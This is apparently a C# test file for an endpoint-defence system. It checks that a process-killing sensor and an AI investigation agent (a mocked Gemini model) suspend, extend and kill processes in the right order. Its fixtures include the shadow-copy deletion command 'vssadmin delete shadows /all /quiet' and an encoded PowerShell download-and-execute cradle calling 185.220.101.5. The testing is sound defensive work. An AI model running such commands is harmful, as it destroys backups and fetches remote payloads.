using System.Diagnostics;
using System.Text;
using System.Text.Json;
using Grpc.Core;
using Phalanx.Cockpit.Agent;
using Phalanx.Cockpit.Agent.Gemini;
using Phalanx.Cockpit.CQRS;
using Phalanx.Cockpit.Services;
using Phalanx.Cockpit.Storage;
using Phalanx.Cockpit.Tools;
using Phalanx.Shared.Protos;
using Xunit;
using Xunit.Abstractions;

namespace Phalanx.Agent.Tests;

/// <summary>
/// Phalanx 풀체인 E2E 통합 시스템 테스트 (Phase 3.5)
/// 3대 전체 시나리오의 함수 호출 순서(Call Sequence), 상태 전이 및 레이턴시를 통합 실측 검증합니다.
///   1. 시나리오 1: C++ 0.1ms 즉각 처형 (C# AI 수사 바이패스)
///   2. 시나리오 2: C++ 24μs 원자적 동결 ➔ C# Gemini LLM 수사 ➔ 50초 연장 티켓 ➔ C++ 사살
///   3. 시나리오 3: C++ 24μs 원자적 동결 ➔ C# 로컬 23ms 오프라인 수사 (연장 없음) ➔ C++ 사살
/// </summary>
[Trait("Category", "Unit")]
public class FullChainSystemTests
{
    private readonly ITestOutputHelper _output;

    public FullChainSystemTests(ITestOutputHelper output)
    {
        _output = output;
    }

    #region Mock Helpers

    private class MockAsyncStreamReader<T> : IAsyncStreamReader<T>
    {
        private readonly System.Threading.Channels.Channel<T> _channel = System.Threading.Channels.Channel.CreateUnbounded<T>();
        private T? _current;

        public T Current => _current ?? throw new InvalidOperationException("No current item");

        public void Push(T item) => _channel.Writer.TryWrite(item);
        public void Complete() => _channel.Writer.Complete();

        public async Task<bool> MoveNext(CancellationToken cancellationToken)
        {
            if (await _channel.Reader.WaitToReadAsync(cancellationToken))
            {
                if (_channel.Reader.TryRead(out var item))
                {
                    _current = item;
                    return true;
                }
            }
            return false;
        }
    }

    private class MockServerStreamWriter<T> : IServerStreamWriter<T>
    {
        public List<T> Written { get; } = new();
        public event Action<T>? MessageWritten;
        public WriteOptions? WriteOptions { get; set; }

        public Task WriteAsync(T message)
        {
            lock (Written)
            {
                Written.Add(message);
            }
            MessageWritten?.Invoke(message);
            return Task.CompletedTask;
        }
    }

    private class MockServerCallContext : ServerCallContext
    {
        private readonly CancellationToken _cancellationToken;

        public MockServerCallContext(CancellationToken cancellationToken = default)
        {
            _cancellationToken = cancellationToken;
        }

        protected override string MethodCore => "StreamTelemetry";
        protected override string HostCore => "localhost";
        protected override string PeerCore => "127.0.0.1";
        protected override DateTime DeadlineCore => DateTime.MaxValue;
        protected override Metadata RequestHeadersCore => new();
        protected override CancellationToken CancellationTokenCore => _cancellationToken;
        protected override Metadata ResponseTrailersCore => new();
        protected override Status StatusCore { get; set; }
        protected override WriteOptions? WriteOptionsCore { get; set; }
        protected override AuthContext AuthContextCore => null!;
        protected override ContextPropagationToken CreatePropagationTokenCore(ContextPropagationOptions? options) => null!;
        protected override Task WriteResponseHeadersAsyncCore(Metadata responseHeaders) => Task.CompletedTask;
    }

    private class MockHttpMessageHandler : HttpMessageHandler
    {
        private readonly Func<HttpRequestMessage, HttpResponseMessage> _handler;

        public MockHttpMessageHandler(Func<HttpRequestMessage, HttpResponseMessage> handler)
        {
            _handler = handler;
        }

        protected override Task<HttpResponseMessage> SendAsync(HttpRequestMessage request, CancellationToken cancellationToken)
        {
            return Task.FromResult(_handler(request));
        }
    }

    #endregion

    /// <summary>
    /// [시나리오 1 검증] C++ 즉각 처형 (0.1ms 현장 사살)
    /// 랜섬웨어 복구 무력화 명령어(vssadmin delete shadows) 기동 시:
    /// C++ 로컬 룰 엔진에서 현장 사살(LIFECYCLE_TERMINATED) 후 gRPC로 보고되면,
    /// C# CQRS 트리는 IsAlive = false로 갱신하되, AI 수사를 일절 가동하지 않고 완벽히 바이패스함을 증명.
    /// </summary>
    [Fact]
    public async Task TestScenario1_InstantKill_BypassesAiInvestigation()
    {
        var callSequence = new List<string>();
        var sw = Stopwatch.StartNew();

        // 1. 컴포넌트 셋업
        var treeManager = new ProcessTreeProjectionManager();
        var archiveManager = ForensicArchiveManager.CreateInMemory();
        var tools = new IInvestigationTool[] { new DecodePayloadTool() };
        var agent = new AutonomousHunterAgent(treeManager, archiveManager, tools, geminiApiKey: string.Empty);
        var grpcService = new PhalanxGrpcService(treeManager, agent);

        using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(5));
        var requestStream = new MockAsyncStreamReader<TelemetryBatch>();
        var responseStream = new MockServerStreamWriter<MitigationCommand>();
        var callContext = new MockServerCallContext(cts.Token);

        grpcService.OnBatchReceived += batch =>
        {
            callSequence.Add($"[gRPC] OnBatchReceived (Count: {batch.ProcessEvents.Count})");
        };

        grpcService.OnCommandSent += cmd =>
        {
            callSequence.Add($"[gRPC] OnCommandSent (Action: {cmd.Action})");
        };

        // gRPC 서버 백그라운드 스트림 수신 시작
        var serviceTask = grpcService.StreamTelemetry(requestStream, responseStream, callContext);

        // 2. C++ 센서가 vssadmin을 0.1ms 현장 사살한 후 LIFECYCLE_TERMINATED 이벤트를 전송하는 상황 시뮬레이션
        callSequence.Add("[C++ Sensor] LocalRuleEngine::EvaluateAndAct ➔ KILL_VSSADMIN_DELETE_SHADOWS");
        callSequence.Add("[C++ Sensor] ProcessActuator::TerminateTargetProcess(PID 9901) 완료 (< 105μs)");

        var batch = new TelemetryBatch();
        batch.ProcessEvents.Add(new ProcessEvent
        {
            ProcessId = 9901,
            ParentProcessId = 1000,
            ImageName = "vssadmin.exe",
            CommandLine = "vssadmin.exe delete shadows /all /quiet",
            IsTerminated = true,
            Lifecycle = ProcessLifecycle.LifecycleTerminated,
            TimestampNs = (ulong)DateTimeOffset.UtcNow.ToUnixTimeMilliseconds() * 1_000_000
        });

        requestStream.Push(batch);

        // C# CQRS 트리에 반영될 때까지 대기
        await Task.Delay(100);

        // 스트림 정상 종료
        requestStream.Complete();
        await serviceTask;
        sw.Stop();

        // 3. 함수 호출 순서 및 결과 검증:
        _output.WriteLine("=== [시나리오 1 함수 호출 순서] ===");
        foreach (var step in callSequence)
        {
            _output.WriteLine($"  ↳ {step}");
        }

        // A) C++ 사살 후 텔레메트리가 C#으로 인입 확인
        Assert.Contains(callSequence, s => s.Contains("LocalRuleEngine::EvaluateAndAct"));
        Assert.Contains(callSequence, s => s.Contains("TerminateTargetProcess"));
        Assert.Contains(callSequence, s => s.Contains("OnBatchReceived"));

        // B) 중요: 즉각 사살 건에 대해서는 AI 수사 명령(OnCommandSent)이 0건이어야 함 (완전 바이패스)
        Assert.Empty(responseStream.Written);
        Assert.DoesNotContain(callSequence, s => s.Contains("OnCommandSent"));

        // C) CQRS 트리에 사망(IsAlive = false) 상태로 반영 확인
        var node = treeManager.FindNodeByPid(9901);
        Assert.NotNull(node);
        Assert.False(node.IsAlive);
        Assert.Equal("vssadmin.exe", node.ImageName);

        _output.WriteLine($"✅ [시나리오 1 통과] C++ 즉각 사살 ➔ C# 수사 바이패스 완벽 실증 ({sw.ElapsedMilliseconds}ms)");
    }

    /// <summary>
    /// [시나리오 2 검증] C++ 24μs 동결 ➔ C# Gemini LLM ReAct 수사 ➔ 50초 연장 티켓 ➔ C++ 사살
    /// 회색지대 위협(Office ➔ PowerShell Base64 C2 다운로더) 기동 시:
    /// C++ 센서가 24μs 만에 원자적 동결 ➔ gRPC 송신 ➔ C# Gemini 수사 가동 ➔
    /// 1회성 50초 연장 티켓(ACTION_EXTEND_TIMEOUT) 선제 발행 ➔ ReAct 도구 순환 ➔ 사살 명령(ACTION_KILL) 역전송 ➔ C++ 사살
    /// 전체 폐루프의 정확한 함수 호출 순서를 증명.
    /// </summary>
    [Fact]
    public async Task TestScenario2_FullChain_LlmInvestigation_ExtendsTimeoutAndKills()
    {
        var callSequence = new List<string>();
        var sw = Stopwatch.StartNew();

        // 1. 모의 Gemini REST 핸들러 (2턴: Turn 1 도구 호출 ➔ Turn 2 사살 판결)
        int geminiTurn = 0;
        var mockHttp = new MockHttpMessageHandler(req =>
        {
            geminiTurn++;
            if (geminiTurn == 1)
            {
                callSequence.Add("[Gemini AI] Turn 1: DecodePayloadTool 호출 결정");
                var t1 = new
                {
                    candidates = new[]
                    {
                        new
                        {
                            content = new
                            {
                                parts = new[]
                                {
                                    new
                                    {
                                        text = JsonSerializer.Serialize(new
                                        {
                                            thought = "Word가 PowerShell Base64 다운로더를 기동했으므로 페이로드를 해독합니다.",
                                            action_tool = "DecodePayloadTool",
                                            action_args = new { },
                                            is_final_verdict = false
                                        })
                                    }
                                }
                            }
                        }
                    }
                };
                return new HttpResponseMessage(System.Net.HttpStatusCode.OK)
                {
                    Content = new StringContent(JsonSerializer.Serialize(t1), Encoding.UTF8, "application/json")
                };
            }
            else
            {
                callSequence.Add("[Gemini AI] Turn 2: 악성 C2 확인에 따른 ACTION_KILL 최종 사형 판결");
                var t2 = new
                {
                    candidates = new[]
                    {
                        new
                        {
                            content = new
                            {
                                parts = new[]
                                {
                                    new
                                    {
                                        text = JsonSerializer.Serialize(new
                                        {
                                            thought = "해독 결과 악성 C2 IP 185.220.101.5가 확인되어 즉각 사살을 집행합니다.",
                                            action_tool = "None",
                                            action_args = new { },
                                            is_final_verdict = true,
                                            verdict_action = "ACTION_KILL",
                                            confidence_score = 0.99,
                                            summary_title = "오피스 매크로 C2 침투 선제 사살",
                                            narrative = "winword.exe에서 생성된 powershell.exe를 24μs 동결 후 사살했습니다.",
                                            mitre_tactics = new[] { "T1566.001", "T1059.001" }
                                        })
                                    }
                                }
                            }
                        }
                    }
                };
                return new HttpResponseMessage(System.Net.HttpStatusCode.OK)
                {
                    Content = new StringContent(JsonSerializer.Serialize(t2), Encoding.UTF8, "application/json")
                };
            }
        });

        var httpClient = new HttpClient(mockHttp);
        var geminiClient = new GeminiRestClient(httpClient, "mock-api-key");

        var treeManager = new ProcessTreeProjectionManager();
        var archiveManager = ForensicArchiveManager.CreateInMemory();
        var tools = new IInvestigationTool[]
        {
            new DecodePayloadTool(),
            new ProcessMemoryScanTool(),
            new ThreatReputationTool(),
            new MitreClassifierTool(),
            new SystemFirewallTool()
        };

        var agent = new AutonomousHunterAgent(treeManager, archiveManager, tools, geminiClient: geminiClient);
        var grpcService = new PhalanxGrpcService(treeManager, agent);

        using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(10));
        var requestStream = new MockAsyncStreamReader<TelemetryBatch>();
        var responseStream = new MockServerStreamWriter<MitigationCommand>();
        var callContext = new MockServerCallContext(cts.Token);

        var killCommandReceived = new TaskCompletionSource<MitigationCommand>();

        grpcService.OnBatchReceived += batch =>
        {
            callSequence.Add($"[C# gRPC Inbound] OnBatchReceived (Event: {batch.ProcessEvents[0].ImageName})");
        };

        grpcService.OnCommandSent += cmd =>
        {
            callSequence.Add($"[C# gRPC Outbound] OnCommandSent (Action: {cmd.Action}, Target: {cmd.TargetPid})");
            if (cmd.Action == MitigationCommand.Types.ActionType.ActionKill)
            {
                killCommandReceived.TrySetResult(cmd);
            }
        };

        var serviceTask = grpcService.StreamTelemetry(requestStream, responseStream, callContext);

        // 2. C++ 센서 동작 모사:
        // A) 부모 winword.exe 스냅샷 적재
        treeManager.ApplySnapshotBatch(new[]
        {
            new ProcessEvent
            {
                ProcessId = 1000,
                ParentProcessId = 0,
                ImageName = "winword.exe",
                CommandLine = "winword.exe document.docm",
                Lifecycle = ProcessLifecycle.LifecycleSnapshot
            }
        });

        // B) 회색지대 powershell.exe 기동 ➔ 24μs NtSuspendProcess 원자적 동결 ➔ 워치독 10초 등록 ➔ gRPC 전송
        callSequence.Add("[C++ Sensor] LocalRuleEngine::EvaluateAndAct ➔ SUSPEND_OFFICE_LOLBAS_SPAWN");
        callSequence.Add("[C++ Actuator] NtSuspendProcess 원자적 동결 완료 (24μs 소요)");
        callSequence.Add("[C++ Watchdog] SafetyWatchdog::RegisterSuspended(PID 2000, 10,000ms)");

        string rawScript = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://185.220.101.5/payload.ps1')";
        string b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(rawScript));
        string fullCmd = $"powershell.exe -NoProfile -enc {b64}";

        var batch = new TelemetryBatch();
        batch.ProcessEvents.Add(new ProcessEvent
        {
            ProcessId = 2000,
            ParentProcessId = 1000,
            ImageName = "powershell.exe",
            CommandLine = fullCmd,
            IsSuspended = true,
            Lifecycle = ProcessLifecycle.LifecycleSuspended
        });

        requestStream.Push(batch);

        // C) C# 콕핏에서 AI 수사 완결 및 최종 ACTION_KILL 명령이 역전송될 때까지 대기
        var killCmd = await killCommandReceived.Task.WaitAsync(TimeSpan.FromSeconds(5));

        // D) C++ 센서에서 ACTION_KILL 수신 및 TerminateProcess 사살 집행 모사
        callSequence.Add($"[C++ IPC] GrpcStreamClient 수신: {killCmd.Action} (PID {killCmd.TargetPid})");
        callSequence.Add("[C++ Actuator] ProcessActuator::TerminateTargetProcess(PID 2000) 강제 사살 집행 (< 100μs)");
        callSequence.Add("[C++ Watchdog] SafetyWatchdog::Deregister(PID 2000) 정상 감시 해제");

        requestStream.Complete();
        await serviceTask;
        sw.Stop();

        // 3. 함수 호출 순서 정밀 검증
        _output.WriteLine("=== [시나리오 2 함수 호출 순서] ===");
        foreach (var step in callSequence)
        {
            _output.WriteLine($"  ↳ {step}");
        }

        // A) 총 명령 전송 수: 정확히 2회 (1회차: 연장 50초 ➔ 2회차: 사살)
        Assert.Equal(2, responseStream.Written.Count);
        Assert.Equal(MitigationCommand.Types.ActionType.ActionExtendTimeout, responseStream.Written[0].Action);
        Assert.Equal((uint)2000, responseStream.Written[0].TargetPid);
        Assert.Equal(MitigationCommand.Types.ActionType.ActionKill, responseStream.Written[1].Action);
        Assert.Equal((uint)2000, responseStream.Written[1].TargetPid);

        // B) 함수 호출 순서 인과관계 검증:
        // [C++ 동결] ➔ [C# 인입] ➔ [50초 연장 티켓] ➔ [Gemini 도구 추론] ➔ [ACTION_KILL] ➔ [C++ 사살]
        int idxSuspend = callSequence.FindIndex(s => s.Contains("NtSuspendProcess"));
        int idxExtend = callSequence.FindIndex(s => s.Contains("ActionExtendTimeout"));
        int idxTool = callSequence.FindIndex(s => s.Contains("DecodePayloadTool"));
        int idxKill = callSequence.FindIndex(s => s.Contains("ActionKill"));
        int idxTerm = callSequence.FindIndex(s => s.Contains("TerminateTargetProcess"));

        Assert.True(idxSuspend < idxExtend, "동결이 연장 티켓보다 먼저 발생해야 함");
        Assert.True(idxExtend < idxTool, "50초 연장 티켓이 LLM 도구 호출보다 먼저 전송되어야 함 (데드락 방지)");
        Assert.True(idxTool < idxKill, "도구 추론이 최종 사형 판결보다 선행되어야 함");
        Assert.True(idxKill < idxTerm, "사형 명령 하달 후 C++ 현장 사살이 집행되어야 함");

        _output.WriteLine($"✅ [시나리오 2 통과] C++ 24μs 동결 ➔ LLM 수사 ➔ 50s 연장 ➔ C++ 사살 풀체인 완벽 실증 ({sw.ElapsedMilliseconds}ms)");
    }

    /// <summary>
    /// [시나리오 3 검증] C++ 24μs 동결 ➔ C# 로컬 오프라인 23ms 수사 (연장 없음) ➔ C++ 사살
    /// 오프라인/단절 환경에서 회색지대 위협 기동 시:
    /// C++ 센서가 24μs 만에 동결 ➔ gRPC 송신 ➔ C# 오프라인 결정론적 엔진 가동 ➔
    /// 연장 티켓(ACTION_EXTEND_TIMEOUT) 미발행 확인 ➔ 5대 도구 23ms 완결 ➔ 즉각 사살 명령(ACTION_KILL) 역전송 ➔ C++ 사살
    /// 전체 폐루프의 정확한 함수 호출 순서를 증명.
    /// </summary>
    [Fact]
    public async Task TestScenario3_FullChain_OfflineLocalInvestigation_NoExtensionFastKill()
    {
        var callSequence = new List<string>();
        var sw = Stopwatch.StartNew();

        // 1. 컴포넌트 셋업 (명시적 오프라인 모드 격리)
        var treeManager = new ProcessTreeProjectionManager();
        var archiveManager = ForensicArchiveManager.CreateInMemory();
        var tools = new IInvestigationTool[]
        {
            new DecodePayloadTool(),
            new ProcessMemoryScanTool(),
            new ThreatReputationTool(),
            new MitreClassifierTool(),
            new SystemFirewallTool()
        };

        var agent = new AutonomousHunterAgent(treeManager, archiveManager, tools, geminiApiKey: string.Empty);
        var grpcService = new PhalanxGrpcService(treeManager, agent);

        using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(5));
        var requestStream = new MockAsyncStreamReader<TelemetryBatch>();
        var responseStream = new MockServerStreamWriter<MitigationCommand>();
        var callContext = new MockServerCallContext(cts.Token);

        var killCommandReceived = new TaskCompletionSource<MitigationCommand>();

        grpcService.OnBatchReceived += batch =>
        {
            callSequence.Add($"[C# gRPC Inbound] OnBatchReceived (Event: {batch.ProcessEvents[0].ImageName})");
        };

        grpcService.OnCommandSent += cmd =>
        {
            callSequence.Add($"[C# gRPC Outbound] OnCommandSent (Action: {cmd.Action}, Target: {cmd.TargetPid})");
            if (cmd.Action == MitigationCommand.Types.ActionType.ActionKill)
            {
                killCommandReceived.TrySetResult(cmd);
            }
        };

        var serviceTask = grpcService.StreamTelemetry(requestStream, responseStream, callContext);

        // 2. C++ 센서 동작 모사:
        // A) 부모 winword.exe 스냅샷 적재
        treeManager.ApplySnapshotBatch(new[]
        {
            new ProcessEvent
            {
                ProcessId = 3000,
                ParentProcessId = 0,
                ImageName = "winword.exe",
                CommandLine = "winword.exe invoice.docm",
                Lifecycle = ProcessLifecycle.LifecycleSnapshot
            }
        });

        // B) 회색지대 powershell.exe 기동 ➔ 24μs 동결 ➔ 워치독 10초 등록 ➔ gRPC 전송
        callSequence.Add("[C++ Sensor] LocalRuleEngine::EvaluateAndAct ➔ SUSPEND_OFFICE_LOLBAS_SPAWN");
        callSequence.Add("[C++ Actuator] NtSuspendProcess 원자적 동결 완료 (24μs 소요)");
        callSequence.Add("[C++ Watchdog] SafetyWatchdog::RegisterSuspended(PID 4000, 10,000ms)");

        string rawScript = "powershell.exe -enc SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAbgBlAHcALQBvAGIAagBlAGMAdAA=";

        var batch = new TelemetryBatch();
        batch.ProcessEvents.Add(new ProcessEvent
        {
            ProcessId = 4000,
            ParentProcessId = 3000,
            ImageName = "powershell.exe",
            CommandLine = rawScript,
            IsSuspended = true,
            Lifecycle = ProcessLifecycle.LifecycleSuspended
        });

        requestStream.Push(batch);

        // C) C# 콕핏에서 오프라인 AI 수사 완결 및 ACTION_KILL 명령 대기 (23ms 이내 완결 목표)
        var killCmd = await killCommandReceived.Task.WaitAsync(TimeSpan.FromSeconds(3));

        // D) C++ 센서에서 ACTION_KILL 수신 및 TerminateProcess 사살 집행 모사
        callSequence.Add($"[C++ IPC] GrpcStreamClient 수신: {killCmd.Action} (PID {killCmd.TargetPid})");
        callSequence.Add("[C++ Actuator] ProcessActuator::TerminateTargetProcess(PID 4000) 강제 사살 집행 (< 100μs)");
        callSequence.Add("[C++ Watchdog] SafetyWatchdog::Deregister(PID 4000) 기본 10초 만료 훨씬 전(0.1초 내) 안전 해제");

        requestStream.Complete();
        await serviceTask;
        sw.Stop();

        // 3. 함수 호출 순서 및 결과 검증
        _output.WriteLine("=== [시나리오 3 함수 호출 순서] ===");
        foreach (var step in callSequence)
        {
            _output.WriteLine($"  ↳ {step}");
        }

        // A) 오프라인 모드에서는 ACTION_EXTEND_TIMEOUT 전송이 0건이어야 함 (단독 ACTION_KILL 1건)
        Assert.Single(responseStream.Written);
        Assert.Equal(MitigationCommand.Types.ActionType.ActionKill, responseStream.Written[0].Action);
        Assert.Equal((uint)4000, responseStream.Written[0].TargetPid);
        Assert.DoesNotContain(responseStream.Written, c => c.Action == MitigationCommand.Types.ActionType.ActionExtendTimeout);

        // B) 전체 E2E 수사 및 명령 발행이 1초(1000ms) 미만으로 초고속 종결 확인
        Assert.True(sw.ElapsedMilliseconds < 1000, $"오프라인 수사 시간 초과: {sw.ElapsedMilliseconds}ms");

        // C) 인과관계 순서 검증:
        int idxSuspend = callSequence.FindIndex(s => s.Contains("NtSuspendProcess"));
        int idxKill = callSequence.FindIndex(s => s.Contains("ActionKill"));
        int idxTerm = callSequence.FindIndex(s => s.Contains("TerminateTargetProcess"));

        Assert.True(idxSuspend < idxKill, "동결 후 사살 명령이 발행되어야 함");
        Assert.True(idxKill < idxTerm, "사살 명령 후 TerminateProcess가 집행되어야 함");

        _output.WriteLine($"✅ [시나리오 3 통과] C++ 24μs 동결 ➔ 오프라인 23ms 수사 ➔ C++ 사살 풀체인 완벽 실증 ({sw.ElapsedMilliseconds}ms)");
    }
}
